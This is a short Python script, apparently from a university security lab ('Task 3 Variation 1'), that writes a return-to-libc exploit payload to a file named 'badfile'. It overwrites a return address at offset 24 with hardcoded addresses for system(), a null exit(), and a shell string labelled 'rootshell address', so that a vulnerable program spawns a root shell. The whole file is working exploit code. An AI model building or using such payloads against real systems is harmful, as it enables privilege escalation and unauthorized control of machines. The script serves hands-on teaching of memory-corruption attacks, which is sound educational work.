#!/usr/bin/env python3
import sys

content = bytearray(0xaa for i in range(300))

system_addr = 0xb7e42da0
exit_addr = 0x00000000  # NO exit function - set to null
sh_addr = 0xbffffdbd    # rootshell address

offset = 24  # Working offset discovered through analysis

content[0:offset] = b'A' * offset
content[offset:offset+4] = (system_addr).to_bytes(4, byteorder='little')
content[offset+4:offset+8] = (exit_addr).to_bytes(4, byteorder='little')
content[offset+8:offset+12] = (sh_addr).to_bytes(4, byteorder='little')

with open("badfile", "wb") as f:
    f.write(content)

print("Task 3 Variation 1: Return-to-libc Attack WITHOUT exit() Function")
print("Purpose: Demonstrate the importance of proper stack cleanup")
print("Expected Result: Program crash after system() execution")